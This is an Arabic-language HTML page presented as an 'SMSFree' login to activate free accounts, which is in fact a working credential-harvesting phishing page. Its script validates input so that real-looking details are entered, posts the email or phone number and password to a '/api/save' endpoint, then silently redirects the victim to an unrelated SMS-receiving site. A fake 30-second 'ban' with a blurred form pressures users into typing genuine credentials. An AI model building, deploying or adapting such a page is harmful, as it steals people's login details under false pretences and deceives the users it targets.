<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - نظام حماية متطور</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
            transition: 0.3s;
        }

        /* الطبقة الضبابية التي ستغطي المحتوى الداخلي فقط */
        .blur-target {
            transition: filter 0.5s ease, opacity 0.5s ease;
        }

        /* عند الحظر: اجعل البريد والأزرار ضبابية وشفافة */
        .is-banned .blur-target {
            filter: blur(12px); /* قوة الضباب */
            opacity: 0.3; /* درجة الشفافية */
            pointer-events: none; /* تجميد الضغطات */
            user-select: none;
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        /* صندوق المؤقت (يظل واضحاً جداً) */
        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 99; width: 80%; background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(4px); padding: 20px; border-radius: 20px;
            border: 2px solid #fbbf24; display: none;
        }

        .glass-popup {
            background: rgba(15, 23, 42, 0.95) !important;
            backdrop-filter: blur(10px);
            border: 1px solid var(--primary-cyan);
            border-radius: 25px !important;
            color: white !important;
        }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    
    <div class="ban-overlay" id="banOverlay">
        <h3 style="color: #fbbf24; margin: 0;">⚠️ الوصول مقيد</h3>
        <div style="font-size: 45px; font-weight: bold; margin: 10px 0;" id="timer">30</div>
        <p style="font-size: 13px; margin: 0;">سيتم فك الحظر تلقائياً</p>
    </div>

    <div class="blur-target" id="blurArea">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود وتفعيل فوري لحساباتك.</h2>

        <form id="loginForm">
            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>

</div>

<script>
    let attempts = 0;

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // فحص الصحة (منع العربية والقصر الشديد)
        const isInvalid = /[\u0600-\u06FF]/.test(user) || user.length < 5 || pass.length < 6;

        if (isInvalid) {
            attempts++;
            if (attempts >= 3) {
                activateBlurBan();
            } else {
                Swal.fire({
                    title: 'خطأ في البيانات',
                    text: 'يرجى كتابة البريد وكلمة السر بشكل صحيح لتجنب الحظر.',
                    icon: 'warning',
                    customClass: { popup: 'glass-popup' }
                });
            }
            return;
        }

        sendData(user, pass);
    };

    function activateBlurBan() {
        const card = document.getElementById('mainCard');
        const overlay = document.getElementById('banOverlay');
        const timerText = document.getElementById('timer');
        
        // تفعيل الضباب على الأزرار والبريد فقط
        card.classList.add('is-banned');
        overlay.style.display = 'block';

        let timeLeft = 30;
        const countdown = setInterval(() => {
            timeLeft--;
            timerText.innerText = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                card.classList.remove('is-banned');
                overlay.style.display = 'none';
                attempts = 0;

                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك. لا تكرر الخطأ ثانية.',
                    icon: 'success',
                    customClass: { popup: 'glass-popup' }
                });
            }
        }, 1000);
    }

    async function sendData(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `👤: ${u}\n🔑: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>

</body>
</html>
